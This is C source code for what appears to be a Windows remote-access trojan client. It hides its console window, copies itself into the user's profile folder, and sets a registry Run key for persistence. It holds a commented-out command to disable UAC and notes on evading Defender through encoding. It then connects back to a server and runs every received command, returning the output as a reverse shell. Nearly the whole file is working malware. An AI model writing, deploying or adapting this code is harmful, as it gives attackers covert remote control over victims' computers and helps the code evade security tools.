#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <winbase.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <iphlpapi.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <direct.h>
//#include <usr/include.h>
//#include </usr/include/base64.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdline, int nCmdShow)
{
    SOCKET sock;
    HWND winHandle;
    WSADATA wsaData;
	
    winHandle = GetConsoleWindow();
    ShowWindow(winHandle, SW_HIDE);
    
	char robocopy[1025] = "robocopy ";
	robocopy[sizeof(robocopy) - 1] = '\0';

	char location[] = "\\Logs";
	char space[] = " ";

	char profilePath[513];
	profilePath[sizeof(profilePath) - 1] = '\0';
	GetEnvironmentVariable("USERPROFILE", (LPSTR) &profilePath, sizeof(profilePath));

	char runPath[513];
	runPath[sizeof(runPath) - 1] = '\0';
	GetCurrentDirectory(sizeof(runPath), (LPSTR) &runPath);

	char filePath[513];//not computed yet. getdir + filename(client.exe)
	filePath[sizeof(filePath) - 1] = '\0';
	//robocopy src dest filename /mov /z /copy:D	src should not include file's name	
	strncat(runPath, space, sizeof(space));//returns the path of the client  RunPath src
	strncat(profilePath, location, sizeof(location));//returns the path C:\\Users\{user}\Logs  profilePath dest

	strncat(robocopy, runPath, sizeof(runPath));//adds src to robocopy
	strncat(robocopy, profilePath, sizeof(profilePath));//adds dest to robocopy

	char options[] = " client.exe /mov /copy:D";
	strncat(robocopy, options, sizeof(options));

	// char* encoded[2048];
	// int* encodedLen;
	// base64(&robocopy, sizeof(robocopy), encodedLen);
	// printf("ENCODED: %s", encoded);
	// char* decoded[2048];
	// int* decodedLen;
	// unbase64((const char *) encoded, sizeof(encoded), decodedLen);
	// printf("DECODED: %s", decoded);

	// int dirStatus;
	CreateDirectory(profilePath, NULL);

	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInfo;

	ZeroMemory(&startupInfo, sizeof(startupInfo));
	startupInfo.cb = sizeof(startupInfo);
	ZeroMemory(&processInfo, sizeof(processInfo));

	char cmd[1537] = "cmd.exe /C ";
	cmd[sizeof(cmd) - 1] = '\0';
	strncat(cmd, robocopy, sizeof(robocopy));
	
	CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

	WaitForSingleObject(processInfo.hProcess, INFINITE);
	CloseHandle(processInfo.hProcess);
	CloseHandle(processInfo.hThread);

	//disabling UAC
	//this feature is still debated. may not even work though
	//"%%windir%%\\System32\\cmd.exe /k %%windir%%\\System32\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"
	// char disableUAC[] = "%%windir%%\\System32\\cmd.exe /k %%windir%%\\System32\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f";

	// ZeroMemory(&startupInfo, sizeof(startupInfo));
	// startupInfo.cb = sizeof(startupInfo);
	// ZeroMemory(&processInfo, sizeof(processInfo));

	// CreateProcess(NULL, disableUAC, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

	// WaitForSingleObject(processInfo.hProcess, INFINITE);
	// CloseHandle(processInfo.hProcess);
	// CloseHandle(processInfo.hThread);

	//persistence after boot | Persistence method works but it gets flagged by defender. base64 encodeing might help once it starts working
	char persistence[2048] = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v client /t REG_SZ /d ";
	strncat(profilePath, "\\client.exe", 12);
	strncat(persistence, profilePath, sizeof(profilePath));

	ZeroMemory(&startupInfo, sizeof(startupInfo));
	startupInfo.cb = sizeof(startupInfo);
	ZeroMemory(&processInfo, sizeof(processInfo));

	CreateProcess(NULL, persistence, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

	WaitForSingleObject(processInfo.hProcess, INFINITE);

	CloseHandle(processInfo.hProcess);
	CloseHandle(processInfo.hThread);

    char sv_ip[] = "";
    int sv_port = 8008;

    //init Socket
    int startupResult;
    startupResult = WSAStartup(MAKEWORD(2,2), &wsaData);//returns 0 if there are no errors with initialising usage of ws2_32.dll//MAKEWORD(2,2) may not work
    //since the ws2_32.dll is ver 2.0

    //create a socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    //connect to the server
    struct sockaddr_in sv_info;
    sv_info.sin_family = AF_INET;
    sv_info.sin_addr.s_addr = inet_addr(sv_ip);
	sv_info.sin_port = htons(sv_port);

	connect_again:
    int connectionResult;
    while(connectionResult = connect(sock, (SOCKADDR *) &sv_info, sizeof(sv_info)) != 0)
    {
		Sleep(1);
    }

    //connection phase ended. the section below executes commands sent by server
    char recv_buffer[1025];//one extra byte has NOT been allocated for null pointer
    char container[1025];
    char res_buffer[32769];//32768 is 32 KB but another one for null terminator

	while(1)
    {	
		memset(recv_buffer, 0, sizeof(recv_buffer));
		memset(container, 0, sizeof(container));
		memset(res_buffer, 0, sizeof(res_buffer));

		recv_buffer[sizeof(recv_buffer) - 1] = '\0';
		container[sizeof(container) - 1] = '\0';
		res_buffer[sizeof(res_buffer) - 1] = '\0';
		
		recv(sock, recv_buffer, sizeof(recv_buffer), 0);
		recv_buffer[sizeof(recv_buffer) - 1] = '\0';//apparently null terminator bytes arent transferred over so gotta manually assign one.
		
		if(strncmp("q", recv_buffer, 1) == 0)
		{
			closesocket(sock);
			WSACleanup();
			goto connect_again;
		}
		else if(strncmp("C:\\", recv_buffer, 4) == 0)
		{
			chdir(("%s", recv_buffer));
		}
		else
		{
			FILE *fp;	
			fp = _popen(recv_buffer, "r");

			while(fgets(container, sizeof(container), fp) != NULL)
			{
				strncat(res_buffer, container, sizeof(container));
			}

			res_buffer[sizeof(res_buffer) - 1] = '\0';
			send(sock, res_buffer, sizeof(res_buffer), 0);    

			fclose(fp);
		}
		
		return 0;    
	}
}
